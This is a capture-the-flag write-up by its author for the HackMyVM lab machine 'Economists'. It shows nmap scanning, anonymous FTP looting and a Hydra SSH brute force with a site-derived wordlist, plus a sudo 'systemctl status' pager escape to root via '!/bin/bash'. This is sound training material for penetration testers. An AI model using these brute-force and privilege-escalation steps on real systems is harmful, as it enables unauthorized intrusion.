---
title: Write-up Economists on HackMyVM
author: eMVee
date: 2023-10-10 20:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP]
render_with_liquid: false
---

Elite-Economists is a vulnerable virtual machine developed by me. This machine is a so-called boot2root machine and is intended to guide aspiring hackers to their OSCP certification. The machine can be downloaded from www.hackmyvm.eu and is known as 'Economists'. In this write-up I describe how you could hack this machine. If you want to learn something, try hacking this machine yourself first and if you really can't figure it out, you can read this writeup to learn from it.

## Getting started
First things first! Before starting hacking we should create a working directory for this machine. 
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HMV/ 

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ mkdir elite-economists

┌──(emvee㉿kali)-[~/Documents/HMV]
└─$ cd elite-economists
```
Now we should check our own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 466sec preferred_lft 466sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:9c:5e:fc:1e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```

----
## Enumeration

To identify other hosts a live in our network we can use fping. 
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.12
10.0.2.15
```
Let's add the IP address of our target to a variable.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ ip=10.0.2.12

```
As first we have to know what we are attacking. We should run a port scan with Nmap to identify open ports and services on our target.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-14 09:48 CEST
Nmap scan report for 10.0.2.12
Host is up (0.00055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
|_  256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home - Elite Economists
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms 10.0.2.12

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds

```

When nmap finished the scan we should carefully review the results and make some notes. The following items are added to my notes.

- Linux, probably Ubuntu
- Port 21
	- FTP
	- Anonymous access
	- Files (5 PDF files)
- Port 22
	- SSH
	- OpenSSH 8.2p1 Ubuntu
- Port 80
	- HTTP
	- Apache 2.4.41
	- Title: Home - Elite Economists

Based on these notes,  we should consider starting enumeration on the FTP service and check if we could se the files.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ ftp $ip -a                         
Connected to 10.0.2.12.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36502|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
226 Directory send OK.
ftp> 

```
There are indeed five PDF files in the share. Let's transfer them all in once to our working directory with wget.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ wget -m ftp://anonymous:anonymous@$ip
--2023-09-14 09:50:55--  ftp://anonymous:*password*@10.0.2.12/
           => ‘10.0.2.12/.listing’
Connecting to 10.0.2.12:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

10.0.2.12/.listing               [ <=>                                          ]     588  --.-KB/s    in 0s      

2023-09-14 09:50:55 (153 MB/s) - ‘10.0.2.12/.listing’ saved [588]

--2023-09-14 09:50:55--  ftp://anonymous:*password*@10.0.2.12/Brochure-1.pdf
           => ‘10.0.2.12/Brochure-1.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Brochure-1.pdf ... done.
Length: 173864 (170K)

10.0.2.12/Brochure-1.pdf     100%[=============================================>] 169.79K  --.-KB/s    in 0.03s   

2023-09-14 09:50:55 (6.47 MB/s) - ‘10.0.2.12/Brochure-1.pdf’ saved [173864]

--2023-09-14 09:50:55--  ftp://anonymous:*password*@10.0.2.12/Brochure-2.pdf
           => ‘10.0.2.12/Brochure-2.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Brochure-2.pdf ... done.
Length: 183931 (180K)

10.0.2.12/Brochure-2.pdf     100%[=============================================>] 179.62K  --.-KB/s    in 0.01s   

2023-09-14 09:50:55 (11.7 MB/s) - ‘10.0.2.12/Brochure-2.pdf’ saved [183931]

--2023-09-14 09:50:55--  ftp://anonymous:*password*@10.0.2.12/Financial-infographics-poster.pdf
           => ‘10.0.2.12/Financial-infographics-poster.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Financial-infographics-poster.pdf ... done.
Length: 465409 (455K)

10.0.2.12/Financial-infograp 100%[=============================================>] 454.50K  --.-KB/s    in 0.02s   

2023-09-14 09:50:55 (24.9 MB/s) - ‘10.0.2.12/Financial-infographics-poster.pdf’ saved [465409]

--2023-09-14 09:50:55--  ftp://anonymous:*password*@10.0.2.12/Gameboard-poster.pdf
           => ‘10.0.2.12/Gameboard-poster.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Gameboard-poster.pdf ... done.
Length: 269546 (263K)

10.0.2.12/Gameboard-poster.p 100%[=============================================>] 263.23K  --.-KB/s    in 0.01s   

2023-09-14 09:50:55 (17.4 MB/s) - ‘10.0.2.12/Gameboard-poster.pdf’ saved [269546]

--2023-09-14 09:50:55--  ftp://anonymous:*password*@10.0.2.12/Growth-timeline.pdf
           => ‘10.0.2.12/Growth-timeline.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Growth-timeline.pdf ... done.
Length: 126644 (124K)

10.0.2.12/Growth-timeline.pd 100%[=============================================>] 123.68K  --.-KB/s    in 0.01s   

2023-09-14 09:50:55 (8.06 MB/s) - ‘10.0.2.12/Growth-timeline.pdf’ saved [126644]

--2023-09-14 09:50:55--  ftp://anonymous:*password*@10.0.2.12/Population-poster.pdf
           => ‘10.0.2.12/Population-poster.pdf’
==> CWD not required.
==> PASV ... done.    ==> RETR Population-poster.pdf ... done.
Length: 1170323 (1.1M)

10.0.2.12/Population-poster. 100%[=============================================>]   1.12M  --.-KB/s    in 0.01s   

2023-09-14 09:50:55 (80.5 MB/s) - ‘10.0.2.12/Population-poster.pdf’ saved [1170323]

FINISHED --2023-09-14 09:50:55--
Total wall clock time: 0.1s
Downloaded: 7 files, 2.3M in 0.1s (22.3 MB/s)
```
As soon as the PDF files are in our working directory we should analyze them to gain some useful information. We can open the files with xdg-open and read the content of the files.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ xdg-open 10.0.2.12/Brochure-1.pdf 
```

![Brochure](/assets/img/WriteUp/HackMyVM/Economists/Pasted image 20230914095357.png){: width="700" height="400" }

In the PDFs only an email address and a website URL is mentioned.
- info@elite-econimists.hmv
- www.elite-econimists.hmv

There was not really any other useful information at this moment we could use. Let's try to see who did make those files in the metadata.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ cd $ip                      

┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists/10.0.2.12]
└─$ exiftool *.pdf | grep Author
Author                          : joseph
Author                          : richard
Author                          : crystal
Author                          : catherine
Author                          : catherine

```

We have identified four usernames in the five files. Let's add them to a users list.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ nano users.txt

┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ cat users.txt    
joseph
richard
crystal
catherine

```

Since we cannot find any juicy information we should enumerate the website of Elite Economists. Let's open it in Firefox.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ firefox http://$ip &             
[1] 33763
```



![Website](/assets/img/WriteUp/HackMyVM/Economists/Pasted image 20230914095537.png){: width="700" height="400" }

We should enumerate every detail, function and field in the website and make some notes about it.

![error](/assets/img/WriteUp/HackMyVM/Economists/Pasted image 20230914133232.png){: width="700" height="400" }

There is an error message indicating that we should contact an employee to check the status of a service.

Since we did not find anything yet on the website we should consider creating a dictionary based on words of the website. We can utilize cewl to create a file.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ cewl -d 2 -m 5 -w passwords.txt http://$ip
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```
As soon as the dictionary is created we can try to run a brute force attack against the SSH service with Hydra.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ hydra ssh://$ip -L users.txt -P passwords.txt -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-14 09:56:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 1328 login tries (l:4/p:332), ~21 tries per task
[DATA] attacking ssh://10.0.2.12:22/
[22][ssh] host: 10.0.2.12   login: joseph   password: wealthiest
[STATUS] 500.00 tries/min, 500 tries in 00:01h, 860 to do in 00:02h, 32 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
                                                                                      
```
It looks like we have found a password for the user `joseph`. We should add the username and password to our notes.
```PASSWORD
wealthiest
```

------
## Initial access
With the credentials we have found we could try to logon to the SSH service as Joseph.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/elite-economists]
└─$ ssh joseph@$ip                     
joseph@10.0.2.12's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 14 Sep 2023 07:58:34 AM UTC

  System load:  0.02               Processes:               120
  Usage of /:   46.9% of 11.21GB   Users logged in:         0
  Memory usage: 5%                 IPv4 address for enp0s3: 10.0.2.12
  Swap usage:   0%


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

51 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


joseph@elite-economists:~$ 

```
It was successful to log in as Joseph. An Ubuntu 20.04.6 version is used and a new Ubuntu version is available. This is information we need to add to our notes.

First we have to check which user we are, which memberships this user has, which machine we are working on and whether there are multiple IP addresses and in which folder we are working. This is also useful if you are preparing for the OSCP exam.
```bash
joseph@elite-economists:~$ whoami;id;hostname;ip a;pwd
joseph
uid=1001(joseph) gid=1001(joseph) groups=1001(joseph)
elite-economists
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:e0:55:e3 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.12/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 596sec preferred_lft 596sec
    inet6 fe80::a00:27ff:fee0:55e3/64 scope link 
       valid_lft forever preferred_lft forever
/home/joseph
joseph@elite-economists:~$ ls -la
total 32
drwxr-xr-x 4 joseph joseph 4096 Sep 14 07:56 .
drwxr-xr-x 6 root   root   4096 Sep 13 21:05 ..
-rw------- 1 joseph joseph    0 Sep 14 06:57 .bash_history
-rw-r--r-- 1 joseph joseph  220 Sep 13 21:03 .bash_logout
-rw-r--r-- 1 joseph joseph 3771 Sep 13 21:03 .bashrc
drwx------ 2 joseph joseph 4096 Sep 14 07:56 .cache
drwxrwxr-x 3 joseph joseph 4096 Sep 13 21:19 .local
-rw-r--r-- 1 joseph joseph  807 Sep 13 21:03 .profile
-rw-rw-r-- 1 joseph joseph 3271 Sep 14 06:55 user.txt

```
The use flag is in the home directory of this user. Let's capture the first flag.

![Flag1](/assets/img/WriteUp/HackMyVM/Economists/Pasted image 20230914100004.png){: width="700" height="400" }
Let's see if we can run any sudo command.
```bash
joseph@elite-economists:~$ sudo -l
Matching Defaults entries for joseph on elite-economists:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status
```
It looks like we can run the command `/usr/bin/systemctl status` as sudo

-----
## Privilege escalation
While running that command the program `less` is shown to us. This could be exploited since the version of `systemd` is before `247`. 
```bash
joseph@elite-economists:~$ sudo /usr/bin/systemctl status
● elite-economists
    State: running
     Jobs: 0 queued
   Failed: 0 units
    Since: Thu 2023-09-14 07:33:52 UTC; 26min ago
   CGroup: /
           ├─user.slice 
           │ └─user-1001.slice 
           │   ├─session-3.scope 
           │   │ ├─1555 sshd: joseph [priv]
           │   │ ├─1653 sshd: joseph@pts/0
           │   │ ├─1654 -bash
           │   │ ├─1674 sudo /usr/bin/systemctl status
           │   │ ├─1675 /usr/bin/systemctl status
           │   │ └─1676 pager
           │   └─user@1001.service …
           │     └─init.scope 
           │       ├─1571 /lib/systemd/systemd --user
           │       └─1572 (sd-pam)
           ├─init.scope 
           │ └─1 /sbin/init maybe-ubiquity
           └─system.slice 
             ├─apache2.service 
             │ ├─753 /usr/sbin/apache2 -k start
             │ ├─755 /usr/sbin/apache2 -k start
             │ └─756 /usr/sbin/apache2 -k start
             ├─systemd-networkd.service 
             │ └─637 /lib/systemd/systemd-networkd
             ├─systemd-udevd.service 
             │ └─394 /lib/systemd/systemd-udevd
             ├─cron.service 
             │ └─655 /usr/sbin/cron -f
             ├─polkit.service 
             │ └─676 /usr/lib/policykit-1/polkitd --no-debug
             ├─networkd-dispatcher.service 
             │ └─675 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
             ├─multipathd.service 
             │ └─554 /sbin/multipathd -d -s
             ├─accounts-daemon.service 
             │ └─651 /usr/lib/accountsservice/accounts-daemon
             ├─ModemManager.service 
             │ └─721 /usr/sbin/ModemManager
             ├─systemd-journald.service 
             │ └─358 /lib/systemd/systemd-journald
             ├─atd.service 
             │ └─692 /usr/sbin/atd -f
             ├─unattended-upgrades.service 
             │ └─707 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
             ├─ssh.service 
             │ └─728 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
             ├─snapd.service 
             │ └─681 /usr/lib/snapd/snapd
             ├─vsftpd.service 
lines 1-53

```

To gain a root shell we should enter the following in less: `!/bin/bash`
```bash
!/bin/bash
```
A root shell is shown and we can own the whole machine. Let's capture everything as we should do for the OSCP exam.
```bash
root@elite-economists:/home/joseph# whoami;hostname;id;ip a
root
elite-economists
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:e0:55:e3 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.12/24 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 457sec preferred_lft 457sec
    inet6 fe80::a00:27ff:fee0:55e3/64 scope link 
       valid_lft forever preferred_lft forever

```
And then capture the root flag.
![Flag2](/assets/img/WriteUp/HackMyVM/Economists/Pasted image 20230914100219.png){: width="700" height="400" }


